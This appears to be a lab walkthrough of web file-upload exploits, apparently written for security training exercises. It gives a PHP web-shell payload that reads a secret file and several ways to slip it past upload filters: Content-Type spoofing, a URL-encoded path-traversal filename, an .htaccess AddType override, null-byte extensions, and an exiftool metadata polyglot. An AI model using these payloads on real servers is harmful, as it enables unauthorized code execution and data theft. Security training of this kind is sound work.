**Step 1:**

Login with given credential

<img src="images/image2.png" alt="third" width="500">

**Step 2:**

Create a .php and save this exploit

`<?php echo file_get_contents('/home/carlos/secret'); ?>`

And upload it

<img src="images/image3.png" alt="third" width="500">

<img src="images/image4.png" alt="third" width="500">

**Step 3:**

We can see in burpsuite the file is upload and in responce we have answer

<img src="images/image5.png" alt="third" width="700">

We can see the answer from url

<img src="images/image6.png" alt="third" width="500">

<img src="images/image7.png" alt="third" width="500">

**Step 1:**

In this lab we cannot directly upload a file it give error

<img src="images/image8.png" alt="third" width="500">

**Step 2:**

So in this lab we change the content type to image/png in burpuite and file will be uploaded

So first we intercept the request.

<img src="images/image9.png" alt="third" width="700">

**Step 3:**

Change content type to image/png or image/jpeg

I first send it to repeater

<img src="images/image10.png" alt="third" width="700">

From here it is clear that file is uploaded.

**Step4:**

Stop intercept and see the result

<img src="images/image11.png" alt="third" width="500">

<img src="images/image12.png" alt="third" width="500">

**Step 1:**

In this lab we again upload file with same payload.but it will not give error and not execute the file.

<img src="images/image13.png" alt="third" width="500">

**Step 2:**

In this case we will upload file to one level up. But the ../ will be url encoded like

<img src="images/image14.png" alt="third" width="700">

Send the request to repeater

**Step 3:**

Change file name to

`../payload.php but url encoded like:..%2fpayload.php`

<img src="images/image15.png" alt="third" width="700">

In url we have the result

<img src="images/image16.png" alt="third" width="500">

<img src="images/image17.png" alt="third" width="500">

**Step1**

First upload file payload.php

<img src="images/image18.png" alt="third" width="500">

<img src="images/image19.png" alt="third" width="500">

**Step 2**

Now we turn on intercept and try by changing changing extension

<img src="images/image20.png" alt="third" width="500">

Send it to repeater.

<img src="images/image21.png" alt="third" width="700">

By changing file type, file is uploaded successfully.But it is not executing the inner text

<img src="images/image22.png" alt="third" width="500">

**Step 3**

Now we change the server setting  by sending .htaccess extension and add this line

`AddType application/x-httpd-php .newEXT`

<img src="images/image23.png" alt="third" width="700">

Here the extension is change to newEXT

Now we upload file with extension payload.newEXT

<img src="images/image24.png" alt="third" width="700">

Now file is uploaded and webshell is executed successfully.

<img src="images/image25.png" alt="third" width="500">

**Step 1:**

First we upload file as it is

<img src="images/image26.png" alt="third" width="500">

It only get png and jpg file

**Step 2:**

Again we turn on intercept and send the request to repeater.

**Step3**

Now we changing extension by adding null bytes

<img src="images/image27.png" alt="third" width="700">

Now  the file is uploaded successfully

<img src="images/image28.png" alt="third" width="500">

<img src="images/image29.png" alt="third" width="500">

**Step1**

To solve this lab we make a file with php extension and a payload in its meta deta. Other properties of a images file.

So we use command

`exiftool -Comment="<?php echo 'starting point<< ' . file_get_contents('/home/carlos/secret') . ' >>Ending of file'; ?>" cat.png -o payload.php`

<img src="images/image30.png" alt="third" width="500">

Now one php file is created but other properties of png file

<img src="images/image31.png" alt="third" width="500">

<img src="images/image32.png" alt="third" width="500">


Uploading this file and we have a secret.

<img src="images/image33.png" alt="third" width="500">

<img src="images/image34.png" alt="third" width="500">
